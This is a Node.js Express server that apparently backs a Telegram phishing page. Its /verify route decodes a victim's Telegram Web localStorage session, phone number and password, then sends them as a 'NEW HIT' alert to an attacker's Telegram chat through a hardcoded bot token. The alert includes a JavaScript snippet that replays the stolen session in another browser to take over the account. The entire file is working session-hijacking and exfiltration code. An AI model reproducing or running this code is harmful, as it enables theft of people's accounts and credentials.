const TelegramBot = require('node-telegram-bot-api')
const express = require('express')
const cors = require('cors')
const app = express()
const path = require('path')
const bodyParser = require('body-parser')
const axios = require('axios')

const token = '7239679051:AAHFhF29L_oLiBU8ZErER1u199aNzZw9rps'
const chatId = -1002208412209


const bot = new TelegramBot(token, { polling: true })

const getUserData = async (userId) => {
    try {
        const user = await bot.getChat(userId)
        return user
    } catch (error) {
        return null
    }
}
  
app.use(bodyParser.text())
app.use(express.json())
app.use(cors())

app.use(express.static(path.join(__dirname, 'public')))

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'))
})

app.post('/verify', async (req, res) => {
    const decodedData = atob(req.body)
    const jsonData = JSON.parse(decodedData)
    const parsedLs = JSON.parse(jsonData.ls)
    const userAuth = JSON.parse(parsedLs.user_auth)
    const userId = userAuth.id
    const userData = await getUserData(userId)

    const textMessage = [
        `NEW HIT JUST ARRIVED 🔻\n`,

        ...(userData?[`Name: ${userData?.first_name ? `${userData.first_name} ` : ''}${userData?.last_name ? userData.last_name : ''}`]:[]),
        ...(userData?[`Username: ${userData.username}`]:[]),
        ...(jsonData.phone?[`Phone: ${jsonData.phone}`]:[]),
        ...(jsonData.pass?[`Password: ${jsonData.pass}`]:[]),
        '\n',

        `CODE FOR LOGIN:\n`,
        `localStorage.clear();const data=${jsonData.ls},stringifiedData=JSON.stringify(data),newData=JSON.parse(stringifiedData.replaceAll(atob("ImNobmdfdGltZSI="),(new Date).getTime().toString()));Object.keys(newData).forEach((a=>{"object"==typeof newData[a]?localStorage.setItem(a,JSON.stringify(newData[a])):localStorage.setItem(a,newData[a])})),location.reload();`
    ].join('\n')

    axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: textMessage
    })
    .then(response => {
        //console.log('Message sent:', response.data)
    })
    .catch(error => {
        //console.error('Error sending message:', error)
    })

    res.status(400).end()
})

app.listen(3000, () => {
    console.log('Server running on port 3000')
})